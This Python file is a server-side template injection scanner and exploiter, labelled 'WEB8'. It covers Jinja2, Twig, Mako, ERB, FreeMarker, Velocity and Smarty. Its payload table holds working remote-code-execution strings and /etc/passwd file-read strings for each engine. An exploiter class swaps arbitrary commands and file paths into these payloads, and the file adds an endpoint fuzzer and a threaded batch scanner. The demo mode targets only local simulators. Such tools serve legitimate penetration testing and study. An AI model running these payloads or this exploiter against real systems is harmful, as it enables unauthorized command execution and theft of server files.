#!/usr/bin/env python3
"""WEB8 — SSTI Scanner.

Template injection detection for Jinja2, Twig, Mako, ERB, and other
server-side template engines, with payload crafting and RCE verification.

Transport is stdlib urllib. `--demo` runs the full detection engine against a
built-in template-evaluating simulator (and a clean control) over loopback,
exercising the same HTTP code path as a live target.
"""

import argparse
import html as html_mod
import re
import sys
import threading
import urllib.request
import urllib.parse
import urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Optional


class TemplatePayloads:
    """Craft payloads for various template engines."""

    MATH_MARKER = "{{7*7}}"
    MATH_MARKER_ALT = "${7*7}"
    MATH_MARKER_PERC = "<%= 7*7 %>"

    ENGINES = {
        "jinja2": {
            "detect": ["{{7*7}}", "{% print(7*7) %}", "{{config.items()}}"],
            "rce": [
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{().__class__.__bases__[0].__subclasses__()[213]('id',shell=True,stdout=-1).communicate()}}",
                "{%import os%}{{os.popen('id').read()}}",
                "{{lipsum.__globals__['os'].popen('id').read()}}",
                "{{cycler.__init__.__globals__.os.popen('id').read()}}",
            ],
            "read_file": [
                "{{config.__class__.__init__.__globals__['open']('/etc/passwd').read()}}",
                "{{''.__class__.__mro__[1].__subclasses__()[213]('/etc/passwd').read()}}",
            ],
            "ssti_markers": ["jinja2", "jinja", "TemplateSyntaxError"],
        },
        "twig": {
            "detect": ["{{7*7}}", "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"],
            "rce": [
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                "{{['id']|filter('system')}}",
                "{{['cat /etc/passwd']|filter('system')}}",
            ],
            "read_file": ["{{['cat /etc/passwd']|filter('system')}}"],
            "ssti_markers": ["twig", "Twig", "Twig_Error"],
        },
        "mako": {
            "detect": ["<%7*7%>", "${7*7}"],
            "rce": [
                "<%import os%>${os.popen('id').read()}",
                "<%import subprocess%>${subprocess.check_output(['id']).decode()}",
            ],
            "read_file": [
                "<%import os%>${open('/etc/passwd').read()}",
                "<%import os%>${os.popen('cat /etc/passwd').read()}",
            ],
            "ssti_markers": ["mako", "Mako", "SyntaxError"],
        },
        "erb": {
            "detect": ["<%= 7*7 %>"],
            "rce": [
                "<%= `id` %>",
                "<%= system('id') %>",
                "<%= %x{id} %>",
            ],
            "read_file": ["<%= `cat /etc/passwd` %>"],
            "ssti_markers": ["erb", "ERB", "SyntaxError"],
        },
        "freemarker": {
            "detect": ["${7*7}"],
            "rce": [
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
                "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(' ')}",
            ],
            "read_file": [
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /etc/passwd')}",
            ],
            "ssti_markers": ["freemarker", "FreeMarker", "ftl"],
        },
        "velocity": {
            "detect": ["#set($x=7*7)$x"],
            "rce": [
                "#set($cmd='id')#set($proc=$cmd.class.forName('java.lang.Runtime').getRuntime().exec($cmd))#set($is=$proc.getInputStream())#foreach($i in $is.read())$chr($i) #end",
            ],
            "read_file": [],
            "ssti_markers": ["velocity", "Velocity", "vtl"],
        },
        "smarty": {
            "detect": ["{7*7}", "{$x=7*7}{$x}"],
            "rce": [
                "{system('id')}",
                "{if system('id')}{/if}",
            ],
            "read_file": ["{system('cat /etc/passwd')}"],
            "ssti_markers": ["smarty", "Smarty"],
        },
    }


# ---------------------------------------------------------------------------
# Built-in template simulators (importable so tests host them on loopback)
# ---------------------------------------------------------------------------

def _first_param_value(query: str) -> str:
    params = urllib.parse.parse_qs(query)
    for sub in params.values():
        for v in sub:
            return v
    return ""


class VulnSSTIHandler(BaseHTTPRequestHandler):
    """Simulates an app that evaluates template expressions server-side.

    `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, etc. evaluate to 49; invalid
    `{{...}}`/`{%...%}` syntax produces a Jinja2-flavored error page.
    """

    def _render(self, inp):
        if "invalidsyntax" in inp:
            return (
                "<html><body><h1>500 Internal Server Error</h1>"
                "<pre>jinja2.exceptions.TemplateSyntaxError: unexpected token "
                "'invalid syntax'</pre></body></html>",
                500,
            )
        m = re.search(r"(\d+)\s*\*\s*(\d+)", inp)
        if m:
            return "Hello, %s!" % (int(m.group(1)) * int(m.group(2))), 200
        return "Hello, %s!" % inp, 200

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        self._respond(_first_param_value(parsed.query))

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace")
        self._respond(_first_param_value(body))

    def _respond(self, inp):
        body, status = self._render(inp)
        self.send_response(status)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(body.encode())

    log_message = lambda self, fmt, *args: None  # noqa: E731


class CleanSSTIHandler(BaseHTTPRequestHandler):
    """Control server: HTML-escapes input, never evaluates templates."""

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        self._respond(_first_param_value(parsed.query))

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace")
        self._respond(_first_param_value(body))

    def _respond(self, inp):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(
            ("Hello, %s!" % html_mod.escape(inp)).encode()
        )

    log_message = lambda self, fmt, *args: None  # noqa: E731


class SSTIHelpers:
    """Shared payload-crafting helpers for detection and exploitation."""

    MATH_EXPR = re.compile(r"(\d+)\s*\*\s*(\d+)")

    @staticmethod
    def evaluate_math(inp):
        m = SSTIHelpers.MATH_EXPR.search(inp)
        if m:
            return str(int(m.group(1)) * int(m.group(2)))
        return None


class SSTIDetector:
    """Detect template injection vulnerability and identify the engine."""

    MATH_PAYLOADS = [
        ("{{7*7}}", 49),
        ("${7*7}", 49),
        ("<%= 7*7 %>", 49),
        ("#{7*7}", 49),
        ("#set($x=7*7)$x", 49),
        ("{7*7}", 49),
        ("[% 7 * 7 %]", 49),
    ]

    def __init__(self, target_url: str, param: str = "name",
                 method: str = "GET", headers: Optional[dict] = None,
                 timeout: int = 10, verbose: bool = False):
        self.target_url = target_url
        self.param = param
        self.method = method.upper()
        self.headers = headers or {}
        self.timeout = timeout
        self.verbose = verbose
        self.detected_engine = None

    def _send(self, payload: str) -> tuple:
        """Send request with payload in parameter, return (status, body)."""
        if self.method == "GET":
            data = urllib.parse.urlencode({self.param: payload})
            url = f"{self.target_url}?{data}"
            req = urllib.request.Request(url, method="GET")
        else:
            body = urllib.parse.urlencode({self.param: payload}).encode("utf-8")
            req = urllib.request.Request(self.target_url, data=body, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")

        for k, v in self.headers.items():
            req.add_header(k, v)

        if self.verbose:
            print(f"      > {self.method} {self.target_url} param={self.param}")

        try:
            resp = urllib.request.urlopen(req, timeout=self.timeout)
            return resp.status, resp.read().decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", errors="replace")
        except Exception as e:
            return 0, str(e)

    def _send_raw(self, payload: str, content_type: str = "text/plain") -> tuple:
        """Send payload as raw body."""
        req = urllib.request.Request(
            self.target_url,
            data=payload.encode("utf-8"),
            method="POST",
        )
        req.add_header("Content-Type", content_type)
        for k, v in self.headers.items():
            req.add_header(k, v)
        try:
            resp = urllib.request.urlopen(req, timeout=self.timeout)
            return resp.status, resp.read().decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", errors="replace")
        except Exception as e:
            return 0, str(e)

    def get_baseline(self) -> str:
        """Get baseline response with benign input."""
        _, body = self._send("test_input_12345")
        return body

    def detect_math_evaluation(self) -> list:
        """Send math expressions and check if they evaluate."""
        baseline = self.get_baseline()
        results = []
        for payload, expected in self.MATH_PAYLOADS:
            status, body = self._send(payload)
            vulnerable = (
                str(expected) in body
                and str(expected) not in baseline
            )
            results.append({
                "payload": payload,
                "expected": expected,
                "vulnerable": vulnerable,
                "status": status,
            })
            if self.verbose and vulnerable:
                print(f"  [+] Math evaluation: {payload} -> {expected}")
        return results

    def identify_engine(self) -> Optional[str]:
        """Identify the template engine from error messages."""
        engine = None
        trigger_payloads = [
            "{{invalidsyntax}}",
            "{% invalidsyntax %}",
            "${invalidsyntax}",
            "<%= invalidsyntax %>",
            "#if(true)",
        ]
        error_text = ""
        for payload in trigger_payloads:
            status, body = self._send(payload)
            error_text += body.lower() + " "

        engine_keywords = {
            "jinja2": ["jinja", "jinja2", "jinja2.exceptions"],
            "twig": ["twig", "twig_error"],
            "mako": ["mako", "mako.template", "mako.exceptions"],
            "erb": ["erb", "erubis", "actionview"],
            "freemarker": ["freemarker", "ftl", "freemarker.template"],
            "velocity": ["velocity", "vtl", "org.apache.velocity"],
            "smarty": ["smarty", r"smarty\.template"],
            "django": ["templateSyntaxError", "django", "django.template"],
            "tornado": ["tornado.template", "tornado.web"],
        }
        for eng, keywords in engine_keywords.items():
            for kw in keywords:
                if re.search(kw, error_text):
                    engine = eng
                    break
            if engine:
                break
        self.detected_engine = engine
        return engine

    def detect_engine_specific(self) -> dict:
        """Run engine-specific detection payloads."""
        results = {}
        engine = self.detected_engine or self.identify_engine()
        if engine and engine in TemplatePayloads.ENGINES:
            any_vuln = False
            last = {}
            for payload in TemplatePayloads.ENGINES[engine]["detect"]:
                status, body = self._send(payload)
                vuln = "49" in body
                last = {"payload": payload, "vulnerable": vuln, "status": status}
                any_vuln = any_vuln or vuln
            last["vulnerable"] = any_vuln
            results[engine] = last
        else:
            for eng_name, eng_data in TemplatePayloads.ENGINES.items():
                for payload in eng_data["detect"][:1]:
                    status, body = self._send(payload)
                    vuln = "49" in body
                    if vuln:
                        results[eng_name] = {
                            "payload": payload,
                            "vulnerable": True,
                            "status": status,
                        }
                        break
        return results

    def full_scan(self) -> dict:
        """Run complete SSTI detection."""
        results = {"target": self.target_url, "param": self.param}
        results["engine"] = self.identify_engine()
        results["math_eval"] = self.detect_math_evaluation()
        results["engine_specific"] = self.detect_engine_specific()
        results["vulnerable"] = any(r["vulnerable"] for r in results["math_eval"])
        if self.verbose:
            print(f"    vulnerable: {results['vulnerable']}, engine: {results['engine']}")
        return results


class SSTIPayloadBuilder:
    """Build RCE and read-file payloads for a detected engine."""

    @staticmethod
    def get_rce_payloads(engine: str) -> list:
        if engine in TemplatePayloads.ENGINES:
            return TemplatePayloads.ENGINES[engine]["rce"]
        return []

    @staticmethod
    def get_file_read_payloads(engine: str) -> list:
        if engine in TemplatePayloads.ENGINES:
            return TemplatePayloads.ENGINES[engine]["read_file"]
        return []

    @staticmethod
    def get_all_payloads(engine: str) -> dict:
        if engine in TemplatePayloads.ENGINES:
            return TemplatePayloads.ENGINES[engine]
        return {}


class SSTIExploiter:
    """Exploit confirmed SSTI to execute commands or read files."""

    def __init__(self, target_url: str, param: str = "name",
                 method: str = "GET", headers: Optional[dict] = None,
                 engine: Optional[str] = None, timeout: int = 15,
                 verbose: bool = False):
        self.target_url = target_url
        self.param = param
        self.method = method.upper()
        self.headers = headers or {}
        self.engine = engine
        self.timeout = timeout
        self.verbose = verbose
        self.builder = SSTIPayloadBuilder()

    def _send(self, payload: str) -> tuple:
        if self.method == "GET":
            data = urllib.parse.urlencode({self.param: payload})
            url = f"{self.target_url}?{data}"
            req = urllib.request.Request(url, method="GET")
        else:
            body = urllib.parse.urlencode({self.param: payload}).encode("utf-8")
            req = urllib.request.Request(self.target_url, data=body, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
        for k, v in self.headers.items():
            req.add_header(k, v)
        try:
            resp = urllib.request.urlopen(req, timeout=self.timeout)
            return resp.status, resp.read().decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", errors="replace")
        except Exception as e:
            return 0, str(e)

    def verify_rce(self, command: str = "id") -> dict:
        """Try RCE payloads and verify output."""
        engine = self.engine or "jinja2"
        payloads = self.builder.get_rce_payloads(engine)
        for payload_template in payloads:
            payload = payload_template.replace("id", command)
            status, body = self._send(payload)
            if command in body or "uid=" in body:
                return {
                    "rce_confirmed": True,
                    "payload": payload,
                    "output": body.strip(),
                    "status": status,
                }
        return {"rce_confirmed": False, "payloads_tried": len(payloads)}

    def read_file(self, file_path: str = "/etc/passwd") -> dict:
        """Try to read a file via SSTI."""
        engine = self.engine or "jinja2"
        payloads = self.builder.get_file_read_payloads(engine)
        for payload_template in payloads:
            payload = payload_template.replace("/etc/passwd", file_path)
            status, body = self._send(payload)
            if body and status == 200 and "No such file" not in body:
                return {
                    "file_read": True,
                    "path": file_path,
                    "content": body.strip(),
                    "payload": payload,
                    "status": status,
                }
        return {"file_read": False, "path": file_path, "payloads_tried": len(payloads)}

    def fuzz_endpoints(self, base_url: str, paths: list = None,
                       params: list = None) -> list:
        """Fuzz multiple paths and parameters for SSTI."""
        if paths is None:
            paths = ["", "/search", "/profile", "/render", "/template",
                     "/page", "/view", "/index"]
        if params is None:
            params = ["name", "q", "input", "template", "page", "text",
                      "data", "content", "user", "id"]
        results = []
        for path in paths:
            for param in params:
                url = f"{base_url.rstrip('/')}{path}"
                detector = SSTIDetector(url, param=param)
                math_results = detector.detect_math_evaluation()
                vuln = any(r["vulnerable"] for r in math_results)
                if vuln:
                    results.append({
                        "url": url,
                        "param": param,
                        "vulnerable": True,
                    })
        return results


class SSTIScanner:
    """Multi-threaded SSTI scanner for batch testing."""

    def __init__(self, threads: int = 5):
        self.threads = threads

    def _test_url(self, url: str, param: str, method: str = "GET") -> dict:
        try:
            detector = SSTIDetector(url, param=param, method=method)
            results = detector.full_scan()
            return results
        except Exception as e:
            return {"target": url, "param": param, "error": str(e), "vulnerable": False}

    def scan_urls(self, targets: list) -> list:
        """Scan a list of (url, param) tuples concurrently."""
        results = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {}
            for target in targets:
                url = target if isinstance(target, str) else target[0]
                param = target[1] if isinstance(target, (list, tuple)) and len(target) > 1 else "name"
                method = target[2] if isinstance(target, (list, tuple)) and len(target) > 2 else "GET"
                future = executor.submit(self._test_url, url, param, method)
                futures[future] = url

            for future in as_completed(futures):
                results.append(future.result())
        return results


# ---------------------------------------------------------------------------
# Demo
# ---------------------------------------------------------------------------

def run_demo(clean: bool = False, verbose: bool = False):
    """Offline demo: run the full detection engine against a built-in simulator.

    `clean` selects the HTML-escaping control handler; otherwise the
    template-evaluating vulnerable handler is used. Both are served over
    loopback and hit through the exact same urllib HTTP code path as a live
    remote target.
    """
    Handler = CleanSSTIHandler if clean else VulnSSTIHandler
    server = HTTPServer(("127.0.0.1", 0), Handler)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    label = ("CLEAN control (HTML-escapes input)"
             if clean else "VULNERABLE (evaluates template expressions)")
    print("  +------------------------------------------+")
    print("  |        WEB8 -- SSTI Scanner               |")
    print("  +------------------------------------------+")
    print(f"[*] DEMO MODE: template simulator ({label}) on http://127.0.0.1:{port}")
    print("[*] The engine posts payloads through urllib and inspects responses.")
    print()

    url = f"http://127.0.0.1:{port}/greet"
    detector = SSTIDetector(url, param="name", method="GET",
                            timeout=5, verbose=verbose)
    print("[*] Running detection scan (engine ID, math eval, engine-specific)...")
    results = detector.full_scan()

    print("\n  Detection results:")
    print(f"    engine:     {results.get('engine')}")
    print(f"    vulnerable: {results.get('vulnerable')}")
    print("    math evaluation:")
    for r in results.get("math_eval", []):
        marker = "[VULN]" if r["vulnerable"] else "[----]"
        print(f"      {marker}  {r['payload']}")
    print("    engine-specific:")
    for eng, data in results.get("engine_specific", {}).items():
        print(f"      {eng}: vulnerable={data.get('vulnerable')} "
              f"status={data.get('status')}")

    found = bool(results.get("vulnerable"))
    server.shutdown()
    server.server_close()
    print()

    if found and not clean:
        m = [r for r in results["math_eval"] if r["vulnerable"]]
        if m:
            print(f"[+] Template expression evaluated: {m[0]['payload']} -> {m[0]['expected']}")
        print("[+] Demo: SSTI detected on vulnerable simulator (expected behavior).")
        print("[+] Exit 0 -- scanner works correctly.")
        return 0
    if clean and not found:
        print("[+] Demo: clean control produced zero SSTI findings (no false positive).")
        print("[+] Exit 0 -- scanner works correctly.")
        return 0
    print("[-] Demo: unexpected result -- scanner may need tuning.")
    return 1


def demo():
    """Run both simulator demos in sequence."""
    rc = run_demo(clean=False)
    if rc == 0:
        print()
        rc = run_demo(clean=True)
    sys.exit(rc)


def main():
    """CLI entry point."""
    parser = argparse.ArgumentParser(
        description="WEB8 — SSTI Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 ssti_scanner.py --url http://127.0.0.1:8080/?name= --param name\n"
            "  python3 ssti_scanner.py --url http://127.0.0.1:8080/search --param q --method POST\n"
            "  python3 ssti_scanner.py --fuzz http://127.0.0.1:8080 --params name,q,input\n"
            "  python3 ssti_scanner.py --demo\n"
            "  python3 ssti_scanner.py                    # equivalent to --demo\n"
        ),
    )
    parser.add_argument("--url", help="Target URL (with param value in URL for GET)")
    parser.add_argument("--param", default="name", help="Injection parameter name")
    parser.add_argument("--method", default="GET", help="HTTP method (GET/POST)")
    parser.add_argument("--fuzz", help="Fuzz base URL with common paths/params")
    parser.add_argument("--payloads", action="store_true", help="Show payloads for engine")
    parser.add_argument("--engine", default="jinja2", help="Template engine for payload display")
    parser.add_argument("--timeout", type=int, default=10,
                        help="HTTP request timeout in seconds (default: 10)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose request logging and scan details")
    parser.add_argument("--demo", action="store_true",
                        help="Run offline demo against built-in vulnerable/clean simulators")
    args = parser.parse_args()

    if args.demo or not (args.url or args.fuzz or args.payloads):
        demo()
        return

    if args.payloads:
        print(f"=== SSTI Payloads for {args.engine} ===\n")
        data = SSTIPayloadBuilder.get_all_payloads(args.engine)
        if data:
            for key, values in data.items():
                print(f"[{key}]")
                for v in values:
                    print(f"  {v}")
                print()
        else:
            print(f"No payloads found for engine: {args.engine}")
        return

    if args.fuzz:
        print(f"=== SSTI Fuzz: {args.fuzz} ===\n")
        scanner = SSTIScanner()
        params = args.param.split(",") if args.param != "name" else None
        paths = ["", "/search", "/profile", "/render", "/template"]
        targets = []
        for path in paths:
            p_list = params or ["name", "q", "input", "template"]
            for p in p_list:
                targets.append((f"{args.fuzz.rstrip('/')}{path}", p))
        results = scanner.scan_urls(targets)
        for r in results:
            if r.get("vulnerable"):
                print(f"  [VULN] {r['target']}  param={r['param']}")
        print(f"\nScanned {len(results)} combinations.")
        return

    if not args.url:
        print("Error: --url or --fuzz required")
        sys.exit(1)

    print(f"=== SSTI Detection: {args.url} ===\n")
    detector = SSTIDetector(args.url, param=args.param, method=args.method,
                            timeout=args.timeout, verbose=args.verbose)
    results = detector.full_scan()
    print(f"Engine: {results.get('engine', 'unknown')}")
    print(f"Vulnerable: {results.get('vulnerable', False)}")
    print("\nMath evaluation tests:")
    for r in results.get("math_eval", []):
        marker = "[VULN]" if r["vulnerable"] else "[----]"
        print(f"  {marker}  {r['payload']}")
    print("\nEngine-specific:")
    for eng, data in results.get("engine_specific", {}).items():
        print(f"  {eng}: {data}")


if __name__ == "__main__":
    main()